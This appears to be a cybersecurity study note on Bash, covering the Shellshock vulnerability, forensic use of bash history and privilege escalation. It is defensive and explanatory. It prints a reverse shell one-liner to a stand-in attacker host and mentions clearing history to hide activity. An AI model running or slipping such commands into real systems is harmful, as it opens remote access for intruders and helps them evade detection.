# Bash

## What it is
Think of Bash like a direct phone line to the operating system's engine room — you speak plainly, it acts immediately, no graphical middleman. Bash (Bourne Again SHell) is the default command-line interpreter on most Linux/Unix systems, allowing users to execute commands, automate tasks via scripts, and chain programs together using pipes and redirects.

## Why it matters
In the 2014 Shellshock vulnerability (CVE-2014-6271), attackers exploited a flaw in how Bash processed environment variables — a CGI web request could silently execute arbitrary OS commands, compromising millions of web servers with zero authentication required. Defenders must patch Bash promptly and restrict which services can spawn shell processes to contain blast radius.

## Key facts
- Bash scripts use the shebang `#!/bin/bash` as the first line, telling the OS which interpreter to use — its presence in malware indicates scripted automation
- Environment variables in Bash persist for the session scope; attackers abuse this to inject malicious code that executes when a new subshell spawns (Shellshock mechanism)
- Bash history is stored in `~/.bash_history` — a forensic goldmine that logs attacker commands unless they deliberately clear it (`history -c`) or redirect to `/dev/null`
- Reverse shells are commonly written in Bash one-liners (e.g., `bash -i >& /dev/tcp/attacker/4444 0>&1`), exploiting Bash's built-in TCP redirection
- Privilege escalation often targets misconfigured SUID binaries or `sudo` rules that allow Bash execution, granting attackers root via `sudo bash`

## Related concepts
[[Linux Privilege Escalation]] [[Reverse Shell]] [[Command Injection]] [[Environment Variables]] [[Shellshock]]